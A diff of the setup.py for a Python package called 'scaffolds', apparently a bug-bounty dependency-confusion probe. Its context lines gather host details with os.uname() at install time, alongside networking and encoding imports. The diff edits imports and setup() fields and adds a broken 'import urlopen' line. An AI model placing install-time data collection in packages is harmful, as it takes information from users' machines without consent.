@@ -1,9 +1,10 @@
-from urllib.request import urlopen
+import urlopen
 import socket
 import os
 import json
 import base64
-import urllib
+import urllib.parse
+import urllib.request
 
 x = {
   "host": os.uname(),
@@ -29,11 +30,11 @@ setuptools.setup(
     name="scaffolds",
     version="1.0.0",
     url="https://github.com/francisbeaudoinh1/scaffolds",
-    download_url = 'https://github.com/francisbeaudoinh1/scaffolds/archive/v_01.tar.gz'
+    download_url = "https://github.com/francisbeaudoinh1/scaffolds/archive/v_01.tar.gz",
     author="Francis Beaudoin",
     author_email="francisbeaudoin@wearehackerone.com",
 
-    description=desc,
+    description_file=desc,
     long_description=long_desc,
     long_description_content_type='text/markdown',
     keywords=[],
@@ -56,4 +57,3 @@ setuptools.setup(
     entry_points={
     },
 )
-
